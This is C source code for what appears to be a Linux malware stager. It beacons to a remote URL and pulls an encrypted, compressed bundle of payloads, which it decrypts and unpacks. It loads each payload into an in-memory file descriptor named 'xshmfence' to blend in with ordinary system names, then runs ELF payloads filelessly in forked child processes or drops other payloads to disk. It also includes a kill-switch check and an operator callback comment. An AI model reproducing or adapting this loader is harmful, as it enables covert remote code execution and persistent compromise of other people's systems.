#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include "detect.h"
#include "helpers.h"
#include "networking.h"
#include "preferences.h"

int main(int argc, char **argv)
{
    struct MemoryStruct payload;
    void *decrypted;
    void *decompressed;
    PayloadStruct *payloadMeta; // holds the sizes of each payload
    unsigned char *payloadOffset; // hold offset from payload base addr for addressing
    unsigned int numPayloads;
    int payloadFD;       // in memory file descriptor
    int writeReturnSize;
    int d;                               //to hold the return value of detect()
    pid_t child;
    unsigned char *psswd;
    int numFiles = 0;
    char currFileName[strlen(PATH_TO_WRITE) + 5];
    char *formattedURL;
    
    formattedURL = formatURL();
    if (formattedURL == NULL)
        return -1;
    
    payload = beacon(formattedURL);
    payloadOffset = payload.memory; // hold for iteration
    numPayloads = extractInt(payloadOffset);

    payloadMeta = parseMeta(&payloadOffset); // extract all metadata
    if(payloadMeta == NULL){
        free(payload.memory);
        free(formattedURL);
        return -1;
    }


    // password padding
    psswd = psswdPadding(psswd);
    if (psswd == NULL)
    {
        free(payload.memory);
        free(payloadMeta);
        free(formattedURL);
        return -1;
    }

    for (int i = 0; i < numPayloads; i++)
    { // main loop to deploy payloads

        decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[i].encryptedLength, payloadMeta[i].decryptedLength, psswd);
        if (decrypted == NULL)
        {
            free(decrypted);
            free(payload.memory);
            free(payloadMeta);
            free(formattedURL);
            return -1;
        }

        decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[i].uncompressedLength, (uLong)payloadMeta[i].decryptedLength);

        if ((payloadMeta[i].uncompressedLength == 64) && (checkKill(decompressed) == 1))
        {
            return -1;
        }

        while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
        {                                                       // create memory file descriptor for execution
            close(payloadFD);
            //return -1;
        }

        writeReturnSize = write(payloadFD, decompressed, payloadMeta[i].uncompressedLength); // write to mem_fd and error check
        if (writeReturnSize != payloadMeta[i].uncompressedLength)
        {
            free(decompressed);
            free(payload.memory);
            free(payloadMeta);
            free(psswd);
            close(payloadFD);
            free(formattedURL);
            return -1;
        }
        
        d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF

        if (d == 1)
        {
            if ((child = fork()) == 0)
            {
                if (executePayload(payloadFD, payloadMeta[i].argv, payloadMeta[i].envp) == 0) // execute within child
                {
                    //send message to operator
                    free(decompressed);
                    free(payload.memory);
                    free(payloadMeta);
                    free(psswd);
                    close(payloadFD);
                    free(formattedURL);
                    return -1;
                }
            }
            else
            {
                if (payloadMeta[i].flags & 0x1)
                    wait(&child); // wait for child to finish within parent
            }
        }
        else
        {
            if (payloadMeta[i].flags & 0x2){
                sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
                writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
                numFiles++;
            }
        }
        free(decompressed);
        payloadOffset += payloadMeta[i].encryptedLength; // increment offset to point at next payload
    }
    free(payload.memory);
    free(payloadMeta);
    free(psswd);
    free(formattedURL);
    return 0;
}